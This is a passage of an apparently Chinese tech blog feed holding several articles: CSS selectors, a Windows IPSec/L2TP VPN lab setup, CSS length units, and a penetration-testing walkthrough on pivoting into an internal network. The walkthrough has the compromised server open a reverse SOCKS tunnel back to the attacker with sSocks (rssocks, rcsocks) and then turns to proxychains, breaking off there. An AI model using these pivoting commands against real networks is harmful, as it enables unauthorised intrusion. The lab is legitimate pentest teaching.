</code></pre><h2 id="first-child"><a href="#first-child" class="headerlink" title="first-child"></a>first-child</h2><p>指定元素列表中第一个元素的样式。语法如下：</p><pre><code class="css">li:first-child {
  color: red;
}
</code></pre><h2 id="last-child"><a href="#last-child" class="headerlink" title="last-child"></a>last-child</h2><p>和 <code>first-child</code> 是同类型的选择器。<code>last-child</code> 指定元素列表中最后一个元素的样式。语法如下：</p><pre><code class="css">li:last-child {
  color: red;
}
</code></pre><h2 id="nth-child-和-nth-last-child"><a href="#nth-child-和-nth-last-child" class="headerlink" title="nth-child 和 nth-last-child"></a>nth-child 和 nth-last-child</h2><p><code>nth-child</code> 和 <code>nth-last-child</code> 可以指定某个元素的样式或者从后数起某个元素的样式。例如：</p><pre><code class="css">// 指定第 2 个元素
li:nth-child(2) {}

// 指定倒数第 2 个元素
li:nth-last-child(2) {}

// 指定偶数个元素
li:nth-child(even){}

// 指定奇数个元素
li:nth-child(odd){}
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[IPSec VPN 的配置]]></title>
      <url>/2017/03/configure-ipsec-vpn/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>IPSec VPN 指采用 IPSec 协议来实现远程接入的一种 VPN 技术，本篇文章介绍在虚拟机下搭建 IPSec VPN 的全过程（使用 L2TP 连接方式）<a id="more"></a></p><h1 id="环境需求"><a href="#环境需求" class="headerlink" title="环境需求"></a>环境需求</h1><blockquote><p>以下实验机全为虚拟机环境。</p></blockquote><p>注意： 外网 IP 地址段：<code>20.1.1.0</code> 内网 IP 地址段：<code>10.1.1.0</code> VPN 地址池：<code>10.1.1.100~10.1.1.200</code></p><h2 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h2><h3 id="VPN-客户机"><a href="#VPN-客户机" class="headerlink" title="VPN 客户机"></a>VPN 客户机</h3><p><strong>要求：</strong></p><ol><li>Windows 系统为：<code>Windows XP</code></li><li>网络适配器连至 <code>VMnet2</code>，IP 地址配置为：<code>20.1.1.2</code></li></ol><p><strong>作用：</strong></p><ol><li>作为 VPN 客户端连接 VPN 服务器提供的 VPN 服务</li><li>作为 CA 客户端，向 CA 服务器申请 CA 客户端证书</li></ol><h3 id="VPN-服务器"><a href="#VPN-服务器" class="headerlink" title="VPN 服务器"></a>VPN 服务器</h3><p><strong>要求：</strong></p><ol><li>Windows 系统为：<code>Windows 2003</code></li><li>网络适配器连至 <code>VMnet2</code>，IP 地址配置为：<code>20.1.1.1</code></li><li>网络适配器连至 <code>VMnet1</code>，IP 地址配置为：<code>10.1.1.1</code></li></ol><p><strong>作用：</strong></p><ol><li>作为 VPN 服务器为 VPN 客户端提供 VPN 服务</li><li>作为 VPN 服务器向 CA 服务器申请 IPSec 证书</li></ol><h3 id="CA-服务器"><a href="#CA-服务器" class="headerlink" title="CA 服务器"></a>CA 服务器</h3><p><strong>要求：</strong></p><ol><li>Windows 系统为：<code>Windows 2003</code></li><li>网络适配器连至 <code>VMnet1</code>，IP 地址配置为：<code>10.1.1.2</code></li></ol><p><strong>作用：</strong></p><ol><li>作为 CA 服务器搭建 CA 服务</li><li>作为 CA 服务器向 VPN 客户端和 VPN 服务端颁发相关证书</li></ol><h2 id="网络连通性"><a href="#网络连通性" class="headerlink" title="网络连通性"></a>网络连通性</h2><blockquote><p>需保证 VPN 服务器的 VMnet1 可以 ping 通 CA 服务器的 VMnet1</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-1.png" alt="IPSec VPN"></p><blockquote><p>需保证 VPN 客户端的 VMnet2 可以 ping 通 VPN 服务器的 VMnet2</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-2.png" alt="IPSec VPN"></p><blockquote><p>需保证 VPN 客户端的 VMnet2 不可以 ping 通 CA 服务器的 VMnet1</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-3.png" alt="IPSec VPN"></p><h1 id="VPN-服务器搭建-VPN-服务"><a href="#VPN-服务器搭建-VPN-服务" class="headerlink" title="VPN 服务器搭建 VPN 服务"></a>VPN 服务器搭建 VPN 服务</h1><h2 id="创建-VPN-用户"><a href="#创建-VPN-用户" class="headerlink" title="创建 VPN 用户"></a>创建 VPN 用户</h2><p>创建 VPN 用户：user，设置其远程访问权限（拨入或 VPN）为通过远程访问策略控制访问<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-4.png" alt="IPSec VPN"></p><p>创建组：vpn，将用户 user 加入 vpn 组<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-5.png" alt="IPSec VPN"></p><h2 id="开启-VPN-服务"><a href="#开启-VPN-服务" class="headerlink" title="开启 VPN 服务"></a>开启 VPN 服务</h2><h3 id="开启路由和远程访问"><a href="#开启路由和远程访问" class="headerlink" title="开启路由和远程访问"></a>开启路由和远程访问</h3><p>开启路由和远程访问<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-6.png" alt="IPSec VPN"></p><p>启用远程访问（拨号或 VPN）<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-7.png" alt="IPSec VPN"></p><p>选择远程访问方式为 VPN<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-8.png" alt="IPSec VPN"></p><h3 id="选择连接外网接口"><a href="#选择连接外网接口" class="headerlink" title="选择连接外网接口"></a>选择连接外网接口</h3><p>选择连接外网接口<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-9.png" alt="IPSec VPN"></p><h3 id="配置-VPN-地址池"><a href="#配置-VPN-地址池" class="headerlink" title="配置 VPN 地址池"></a>配置 VPN 地址池</h3><p>配置 VPN 地址池<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-10.png" alt="IPSec VPN"></p><p>VPN 地址池配置为：<code>10.1.1.100~10.1.1.200</code><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-111.png" alt="IPSec VPN"></p><h3 id="配置身份验证方式并完成配置"><a href="#配置身份验证方式并完成配置" class="headerlink" title="配置身份验证方式并完成配置"></a>配置身份验证方式并完成配置</h3><p>配置身份验证方式<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-12.png" alt="IPSec VPN"></p><p>完成配置<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-13.png" alt="IPSec VPN"></p><h3 id="新建远程访问策略"><a href="#新建远程访问策略" class="headerlink" title="新建远程访问策略"></a>新建远程访问策略</h3><p>新建远程访问策略<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-14.png" alt="IPSec VPN"></p><p>自定义策略<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-15.png" alt="IPSec VPN"></p><h3 id="添加策略并保存"><a href="#添加策略并保存" class="headerlink" title="添加策略并保存"></a>添加策略并保存</h3><p>允许特殊时间段内才能访问<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-16.png" alt="IPSec VPN"></p><p>允许规定用户组才能访问<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-17.png" alt="IPSec VPN"></p><p>授予远程访问权限<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-18.png" alt="IPSec VPN"></p><p>完成向导<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-19.png" alt="IPSec VPN"></p><h3 id="网络连通性-1"><a href="#网络连通性-1" class="headerlink" title="网络连通性"></a>网络连通性</h3><blockquote><p>此时 VPN 客户端的 VMnet2 不可以 ping 通 VPN 服务器的 VMnet2 和 CA 服务器的 VMnet1</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-20.png" alt="IPSec VPN"></p><h1 id="VPN-客户端连接-VPN-服务器"><a href="#VPN-客户端连接-VPN-服务器" class="headerlink" title="VPN 客户端连接 VPN 服务器"></a>VPN 客户端连接 VPN 服务器</h1><h2 id="新建一个连接"><a href="#新建一个连接" class="headerlink" title="新建一个连接"></a>新建一个连接</h2><p>新建一个连接<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-21.png" alt="IPSec VPN"></p><p>设置连接类型<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-22.png" alt="IPSec VPN"></p><p>使用 VPN 连接<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-23.png" alt="IPSec VPN"></p><h2 id="配置连接的-IP-地址"><a href="#配置连接的-IP-地址" class="headerlink" title="配置连接的 IP 地址"></a>配置连接的 IP 地址</h2><p><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-24.png" alt="IPSec VPN"></p><h2 id="使用-VPN-账户连接-VPN-服务器"><a href="#使用-VPN-账户连接-VPN-服务器" class="headerlink" title="使用 VPN 账户连接 VPN 服务器"></a>使用 VPN 账户连接 VPN 服务器</h2><p>连接 VPN 服务器<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-25.png" alt="IPSec VPN"></p><p>此时的 VPN 连接状态为 PPTP<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-26.png" alt="IPSec VPN"></p><p>此时的 IP 地址配置情况<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-27.png" alt="IPSec VPN"></p><h2 id="网络连通性-2"><a href="#网络连通性-2" class="headerlink" title="网络连通性"></a>网络连通性</h2><blockquote><p>此时 VPN 客户端的 VMnet2 可以 ping 通 VPN 服务器的 VMnet1 和 CA 服务器的 VMnet1</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-28.png" alt="IPSec VPN"></p><blockquote><p>此时 VPN 客户端的 VMnet2 不可以 ping 通 VPN 服务器的 VMnet2</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-29.png" alt="IPSec VPN"></p><h1 id="CA-服务器搭建-CA-服务"><a href="#CA-服务器搭建-CA-服务" class="headerlink" title="CA 服务器搭建 CA 服务"></a>CA 服务器搭建 CA 服务</h1><h2 id="开启-IIS-服务"><a href="#开启-IIS-服务" class="headerlink" title="开启 IIS 服务"></a>开启 IIS 服务</h2><p>开启 IIS 服务<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-30.png" alt="IPSec VPN"></p><p>开启 ASP 配置<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-31.png" alt="IPSec VPN"></p><p>完成配置<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-32.png" alt="IPSec VPN"></p><h2 id="安装-CA-证书服务"><a href="#安装-CA-证书服务" class="headerlink" title="安装 CA 证书服务"></a>安装 CA 证书服务</h2><p>安装 CA 证书服务<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-33.png" alt="IPSec VPN"></p><p>CA 类型为独立根 CA<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-34.png" alt="IPSec VPN"></p><p>完成安装，本地访问测试<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-35.png" alt="IPSec VPN"></p><h1 id="VPN-服务器向-CA-服务器申请-IPSec-证书"><a href="#VPN-服务器向-CA-服务器申请-IPSec-证书" class="headerlink" title="VPN 服务器向 CA 服务器申请 IPSec 证书"></a>VPN 服务器向 CA 服务器申请 IPSec 证书</h1><p>申请 IPSec 证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-36.png" alt="IPSec VPN"></p><p>提交一个高级证书申请<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-37.png" alt="IPSec VPN"></p><p>申请 IPSec 证书，并将证书保存在本地计算机储存中<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-38.png" alt="IPSec VPN"></p><p>申请成功<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-39.png" alt="IPSec VPN"></p><h2 id="CA-服务器颁布-IPSec-证书"><a href="#CA-服务器颁布-IPSec-证书" class="headerlink" title="CA 服务器颁布 IPSec 证书"></a>CA 服务器颁布 IPSec 证书</h2><p>颁布 IPSec 证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-40.png" alt="IPSec VPN"></p><h2 id="VPN-服务器安装导入-IPSec-证书"><a href="#VPN-服务器安装导入-IPSec-证书" class="headerlink" title="VPN 服务器安装导入 IPSec 证书"></a>VPN 服务器安装导入 IPSec 证书</h2><h3 id="查看挂起的证书并安装"><a href="#查看挂起的证书并安装" class="headerlink" title="查看挂起的证书并安装"></a>查看挂起的证书并安装</h3><p>查看挂起的证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-41.png" alt="IPSec VPN"></p><p>选择 IPSec 证书并安装<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-42.png" alt="IPSec VPN"></p><p>安装成功<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-43.png" alt="IPSec VPN"></p><h3 id="下载证书并导入"><a href="#下载证书并导入" class="headerlink" title="下载证书并导入"></a>下载证书并导入</h3><p>下载证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-44.png" alt="IPSec VPN"></p><p>下载 IPSec 证书和证书链<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-45.png" alt="IPSec VPN"></p><p>将证书和证书链导入受信任的证书颁发机构(计算机)中<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-46.png" alt="IPSec VPN"></p><p>证书导入成功显示<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-47.png" alt="IPSec VPN"></p><p>证书链导入成功显示<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-48.png" alt="IPSec VPN"></p><h1 id="VPN-客户机向-CA-服务器申请客户端证书"><a href="#VPN-客户机向-CA-服务器申请客户端证书" class="headerlink" title="VPN 客户机向 CA 服务器申请客户端证书"></a>VPN 客户机向 CA 服务器申请客户端证书</h1><p>申请客户端证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-49.png" alt="IPSec VPN"></p><p>提交一个高级证书申请<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-50.png" alt="IPSec VPN"></p><p>申请 IPSec 证书，并将证书保存在本地计算机储存中<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-51.png" alt="IPSec VPN"></p><p>申请成功<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-52.png" alt="IPSec VPN"></p><h2 id="CA-服务器颁布客户端证书"><a href="#CA-服务器颁布客户端证书" class="headerlink" title="CA 服务器颁布客户端证书"></a>CA 服务器颁布客户端证书</h2><p>器颁布客户端证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-53.png" alt="IPSec VPN"></p><h2 id="VPN-客户端安装导入客户端证书"><a href="#VPN-客户端安装导入客户端证书" class="headerlink" title="VPN 客户端安装导入客户端证书"></a>VPN 客户端安装导入客户端证书</h2><h3 id="查看挂起的证书并安装-1"><a href="#查看挂起的证书并安装-1" class="headerlink" title="查看挂起的证书并安装"></a>查看挂起的证书并安装</h3><p>查看挂起的证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-54.png" alt="IPSec VPN"></p><p>选择客户端证书并安装<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-55.png" alt="IPSec VPN"></p><p>安装成功<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-56.png" alt="IPSec VPN"></p><h3 id="下载证书并导入-1"><a href="#下载证书并导入-1" class="headerlink" title="下载证书并导入"></a>下载证书并导入</h3><p>下载证书<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-57.png" alt="IPSec VPN"></p><p>下载客户端证书和证书链<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-58.png" alt="IPSec VPN"></p><p>将证书和证书链导入受信任的证书颁发机构(计算机)中<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-59.png" alt="IPSec VPN"></p><p>证书导入成功显示<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-60.png" alt="IPSec VPN"></p><p>证书链导入成功显示<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-61.png" alt="IPSec VPN"></p><h1 id="VPN-客户端使用-L2TP-方式连接-VPN"><a href="#VPN-客户端使用-L2TP-方式连接-VPN" class="headerlink" title="VPN 客户端使用 L2TP 方式连接 VPN"></a>VPN 客户端使用 L2TP 方式连接 VPN</h1><p>连接 VPN<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-62.png" alt="IPSec VPN"></p><p>此时的 VPN 连接状态为 L2TP<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/ipsec-vpn-631.png" alt="IPSec VPN"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Security </tag>
            
            <tag> Windows </tag>
            
            <tag> Service </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[7 种新型的 CSS 长度单位]]></title>
      <url>/2016/12/css-length-unit/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>众所周知 CSS 技术我们虽然很熟悉，在使用的过程却很容易被困住，这让我们在新问题出现的时候变得很不利。所以本文将介绍 CSS 中会用到的几个度量单位<a id="more"></a></p><h1 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h1><p>首先介绍下和我们熟悉的很相似的货。 <code>em</code> 被定义为相对于当前对象内文本的字体大小。炒个栗子，如果你给 <code>body</code> 小哥设置了 <code>font-size</code> 字体大小，那么 <code>body</code> 小哥的任何子元素的 <code>1 em</code> 就是等于 <code>body</code> 设置的 <code>font-size</code>。</p><pre><code class="html">&lt;body&gt;
  &lt;div class=&quot;test&quot;&gt;Test&lt;/div&gt;
&lt;/body&gt;
</code></pre><pre><code class="css">body {
  font-size: 14px;
}
div {
  font-size: 1.2em; /* calculated at 14px * 1.2, or 16.8px */
}
</code></pre><p>这里 div 这娃的字体大小是 1.2em。解释来说，就是他从 body 爹爹那里继承的字体大小（这里是14px）的 1.2 倍，结果就是 16.8px。</p><p>但是，如果你用em一层一层级联得定义嵌套元素的字体大小又会花生什么事情呢？在下面这一小段代码里我们应用了和上面一样一样的 CSS，每一个 div 都从它上一级父元素继承了字体大小，并且逐渐得增加。</p><pre><code class="html">&lt;body&gt;
  &lt;div&gt;
    Test &lt;!-- 14 * 1.2 = 16.8px --&gt;
    &lt;div&gt;
      Test &lt;!-- 16.8 * 1.2 = 20.16px --&gt;
      &lt;div&gt;
        Test &lt;!-- 20.16 * 1.2 = 24.192px --&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/body&gt;
</code></pre><p>虽然在某些地方这正是我们想要的，但是通常情况下我们还是希望就依赖单一的相对度量单位就好。这时候嘛，我们就可以使用 <code>rem</code> 了。 <code>‘r’</code> 是 <code>&#39;root</code> 的缩写，意思就是 <code>1rem</code> 等于根元素的字体大小；大部分情况下，根元素就是 <code>&lt;html&gt;</code> 元素了。</p><pre><code class="css">html {
  font-size: 14px;
}
div {
  font-size: 1.2rem;
}
</code></pre><p>这样在上面的那三个嵌套的div娃们的字体大小都是 <code>1.2*14px = 16.8px</code> 了。</p><h1 id="适用于网格布局"><a href="#适用于网格布局" class="headerlink" title="适用于网格布局"></a>适用于网格布局</h1><p><code>Rems</code> 不仅仅只是在设置字体大小上很方便。再炒个栗子，你可以用基于html根元素字体大小的rem作为整个网格布局或者UI库的大小单位，然后在其他特定的地方用em单位。这样将会给你带来更多的字体大小和伸缩的可控性，</p><pre><code class="css">.container {
  width: 70rem; // 70 * 14px = 980px
}
</code></pre><p>概念上来说，这个方法的思想就是让你的界面根据你的内容进行缩放。但是，这样做并不是对所有的情况都有意义。</p><h1 id="vh-and-vw"><a href="#vh-and-vw" class="headerlink" title="vh and vw"></a>vh and vw</h1><p>响应式 Web 设计 离不开百分比。但是，CSS 百分比并不是所有的问题的最佳解决方案。CSS 的宽度是相对于包含它的最近的父元素的宽度的。但是如果你就想用视口（<code>viewpoint</code>）的宽度或者高度，而不是父元素的，那该肿么办？ 这就是 <code>vh</code> 和 <code>vw</code> 单位为我们提供的。</p><p><code>1 vh</code> 等于 <code>1/100</code> 的视口高度。栗子：浏览器高度 <code>900px</code>, <code>1 vh = 900px/100 = 9 px</code>。同理，如果视口宽度为750， <code>1 vw = 750px/100 = 7.5 px</code>。</p><p>可以想象到的，他们有很多很多的用途。比如，我们用很简单的方法只用一行 CSS 代码就实现同屏幕等高的框。</p><pre><code class="css">.slide {
  height: 100vh;
}
</code></pre><p>假设你要来一个和屏幕同宽的标题，你只要设置这个标题的 <code>font-size</code> 的单位为 <code>vm</code> ，那标题的字体大小就会自动根据浏览器的宽度进行缩放，以达到字体和 <code>viewport</code> 大小同步的效果，有木有？！</p><h1 id="vmin-and-vmax"><a href="#vmin-and-vmax" class="headerlink" title="vmin and vmax"></a>vmin and vmax</h1><p><code>vh</code> 和 <code>vm</code> 依据于视口的高度和宽度，相对的， <code>vmin</code> 和 <code>vmax</code>则关于视口高度和宽度两者的最小或者最大值。比如，浏览器的宽度设置为 1100px，高度设置为 700px， <code>1vmin = 1px</code>， <code>1vmax = 11px</code>。如果宽度设置为 800px,高度设置为 1080px, 1vmin 就等于 8px, 1vmax 则为10.8px。</p><p>那么问题来了，我们应该在什么场景下使用这两个单位呢？</p><p>假设有一个元素，你需要让它始终在屏幕上可见。只要对其高度和宽度使用vmin单位，并赋予其低于100的值就可以做到了。再来个栗子，可以这样定义一个至少有两个边触摸到屏幕的方形：</p><pre><code class="css">.box {
  height: 100vmin;
  width: 100vmin;
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/css-length-unit-1.png" alt="CSS 度量单位"></p><p>如果你要让这个方形框框始终铺满整个视口的可见区域（四边始终触摸到屏幕的四边）</p><pre><code class="css">.box {
  height: 100vmax;
  width: 100vmax;
}
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/css-length-unit-2.png" alt="CSS 度量单位"></p><p>结合使用这些单位可以为我们提供一个新颖有意思的方式来灵活地利用我们视口的大小。</p><h1 id="ex-and-ch"><a href="#ex-and-ch" class="headerlink" title="ex and ch"></a>ex and ch</h1><p><code>ex</code> 和 <code>ch</code> 单位，类似于 <code>em</code> 和 <code>rem</code> , 依赖于当前的字体和字体大小。 但是，不同的是，这两货是基于字体的度量单位，依赖于设定的字体。</p><p><code>ch</code> 单位通常被定义为数字 0 的宽度。你可以在 <code>Eric Meyers</code> 的博客里找到关于它的一些有意思的讨论，例如将一个等宽字体的字母”N”的宽度设置为 <code>40ch</code> ，那么在另一种类型的字体里它却可以包含 40个字母。这个单位的传统用途主要是盲文的排版，但是除此之外，肯定还有可以应用他的地方。</p><p><code>ex</code> 定义为当前字体的小写 x 字母的高度或者 1/2 的 1em 。 很多时候，它是字体的中间标志。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/css-length-unit-3.png" alt="CSS 度量单位"></p><p>这些单位有很多用途，大部分用于版式的微调。比方说， <code>sup</code> 元素（上角文字标），可以通过 <code>position:relative;bottom: 1ex;</code> 实现 。类似的方法，你可以实现一个下角文字标。浏览器默认的方式是利用</p><p>上标和下标特定垂直对齐规则，但是如果你想更细粒度更精确得控制，你可以像下面这样做：</p><pre><code class="css">sup {
  position: relative;
  bottom: 1ex;
}
sub {
  position: relative;
  bottom: -1ex;
}
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Socks 代理反弹突破内网]]></title>
      <url>/2016/11/socks-proxy-rebound/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用 Socks 代理反弹获得内网访问权限<a id="more"></a></p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><table><thead><tr><th>机子</th><th>系统</th><th>IP</th></tr></thead><tbody><tr><td>攻击机</td><td><code>kali Liunx</code></td><td>192.168.199.130 (外网)</td></tr><tr><td>目标主机</td><td><code>ubuntu-server</code></td><td>192.168.199.131 (外网)；192.168.235.143 (内网)</td></tr><tr><td>内网主机</td><td><code>Metasploitable2-Liunx</code></td><td>192.168.235.142 (内网)</td></tr></tbody></table><h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><h2 id="sSocks"><a href="#sSocks" class="headerlink" title="sSocks"></a>sSocks</h2><blockquote><p>sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试</p></blockquote><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><blockquote><p><a href="//sourceforge.net/projects/ssocks/">sSocks 更新地址</a><br><br>这里下载的版本为 <code>0.0.14</code></p></blockquote><pre><code class="bash">wget //nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz
</code></pre><h2 id="解压并编译"><a href="#解压并编译" class="headerlink" title="解压并编译"></a>解压并编译</h2><pre><code class="bash">tar -xzvf ssocks-0.0.14.tar.gz
cd ssocks-0.0.14
./configure &amp;&amp; make
</code></pre><blockquote><p>注意：编译的时候要先确定机子上有 gcc 环境，没有的请自行安装</p></blockquote><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>编译完成，进入 sr c目录，会发现有 <code>nsocks</code>、<code>ssocksd</code>、<code>ssocks</code>、<code>rcsocks</code>，其功能说明介绍如下：</p><ul><li><strong>nsocks</strong> 类似通过 Socks5 代理后的 netcat，可用来测试 socks server</li><li><strong>ssocksd</strong> 用来开启 Socks5 代理服务</li><li><strong>ssocks</strong> 本地启用 Socks5 服务，并反弹到另一IP地址</li><li><strong>rcsocks</strong> 接收反弹过来的 Socks5 服务，并转向另一端口</li></ul><h1 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h1><blockquote><p>现假设已获得 <code>ubuntu-server</code> 权限，也将 ssocks 这软件上传至该服务器（包含解压和编译）</p></blockquote><h2 id="执行本地监听"><a href="#执行本地监听" class="headerlink" title="执行本地监听"></a>执行本地监听</h2><p>机子：<code>kali Liunx</code>；IP: <code>192.168.199.130</code></p><pre><code class="bash">cd ssocks-0.0.14/src
./rcsocks -l 1088 -p 1080 -vv
</code></pre><p>等待远程 Socks5 服务器访问本地 1080 端口，创建端口 1080 与本地端口 1088 的连接通道<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/socks-proxy-1.png" alt="Socks 代理"></p><h2 id="开启-Socks5-代理服务，反弹"><a href="#开启-Socks5-代理服务，反弹" class="headerlink" title="开启 Socks5 代理服务，反弹"></a>开启 Socks5 代理服务，反弹</h2><p>机子：<code>ubuntu-server</code>；IP: <code>192.168.199.131</code></p><pre><code class="bash">cd ssocks-0.0.14/src
./rssocks -vv -s 192.168.199.130:1080
</code></pre><p>启用 Socks5 服务，反弹到 <code>192.168.199.130</code>（即 <code>kali Liunx</code>） 的端口 1080 上<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/socks-proxy-2.png" alt="Socks 代理"></p><p>此时在渗透测试端 <code>192.168.199.130</code>（即 <code>kali Liunx</code>） 可看到通道连接成功<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/socks-proxy-3.png" alt="Socks 代理"></p><h2 id="利用-proxychains-进行-Socks5-代理"><a href="#利用-proxychains-进行-Socks5-代理" class="headerlink" title="利用 proxychains 进行 Socks5 代理"></a>利用 proxychains 进行 Socks5 代理</h2><p>机子：<code>kali Liunx</code>；IP: <code>192.168.199.130</code></p><h3 id="proxychains-介绍"><a href="#proxychains-介绍" class="headerlink" title="proxychains 介绍"></a>proxychains 介绍</h3><p>通过前面的步骤，Socks5 代理已创建完成了。由于在渗透测试过程中，需要使用不同的工具程序，而在各程序中分别配置 Socks5 代理信息较为繁琐，而部分程序并不支持配置 Socks5 代理。为了简化这些操作，我们可以采用 <code>proxychains</code>。</p><p>proxychains 是一个代理客户端软件，可以支持几乎所有程序的代理，如 <code>ssh</code>，<code>telnet</code>，<code>ftp</code> 等。利用 <code>proxychains</code>，程序能在代理的环境下被加载运行，而本身不需要具备代理功能。</p><h3 id="proxychains-下载"><a href="#proxychains-下载" class="headerlink" title="proxychains 下载"></a>proxychains 下载</h3><blockquote><p>需要 git 环境，在 <code>kali Liunx</code> 使用 <code>proxychains</code></p></blockquote><pre><code class="bash">git clone https://github.com/haad/proxychains.git
